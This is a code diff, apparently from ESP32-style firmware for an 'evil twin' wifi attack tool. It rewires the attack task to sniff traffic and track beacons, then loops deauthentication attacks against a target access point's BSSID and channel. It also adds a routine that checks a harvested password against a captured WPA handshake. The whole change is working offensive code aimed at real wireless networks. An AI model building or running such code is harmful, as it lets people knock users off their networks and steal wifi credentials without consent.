@@ -8,6 +8,7 @@
 #include "evil_twin.h"
 #include "aircrack.h"
 #include "wifi_attacks.h"
+#include "sniffer.h"
 
 
 #define EVIL_TWIN_TASK_PRIO 5
@@ -55,17 +56,18 @@ static void evil_twin_task(void *pvParameters)
     http_attack_server_start();
 
     /* Start wifi attack engine */
-    wifi_attack_engine_start((target_info_t * )&target);
-
+    wifi_start_sniffing(&target);
+    wifi_start_beacon_tracking();
+    
     while(true)
     {
         /* Spam softAP beacon from STA */
         //wifi_attack_softap_beacon_spam((target_info_t * )&target);
         /* Send deauth to clients */
-        wifi_attack_deauth_basic();
+        wifi_attack_deauth_basic(NULL, target.bssid, 7);
         vTaskDelay(pdMS_TO_TICKS(20));
         //wifi_attack_deauth_client_bad_msg1();
-        wifi_attack_deauth_client_negative_tx_power();
+        wifi_attack_deauth_client_negative_tx_power(target.bssid, target.channel, (char *)&target.ssid);
         //wifi_attack_association_sleep();
         vTaskDelay(pdMS_TO_TICKS(100));
     }
@@ -103,17 +105,18 @@ void evil_twin_stop_attack(void)
     /* Close attack server */
     http_attack_server_stop();
 
-    /* Stop attack engine */
-    wifi_attack_engine_stop();
+    /* Stop sniffer and beacon tracking */
+    wifi_stop_beacon_tracking();
+    wifi_stop_sniffing();
 
     /* Wait engine stop */
-    vTaskDelay(pdMS_TO_TICKS(3000));
+    vTaskDelay(pdMS_TO_TICKS(1000));
 
     /* Restore original hotspot */
     wifi_start_softap();
 
     /* Wait softap restore */
-    vTaskDelay(pdMS_TO_TICKS(3000));
+    vTaskDelay(pdMS_TO_TICKS(1000));
 
     /* Start Admin server */
     http_admin_server_start();
@@ -124,7 +127,7 @@ void evil_twin_stop_attack(void)
 
 bool evil_twin_check_password(char *password)
 {
-    handshake_info_t *handshake = wifi_attack_engine_handshake();
+    const handshake_info_t *handshake = wifi_sniffer_get_handshake();
 
     if( handshake->handshake_captured)
     {
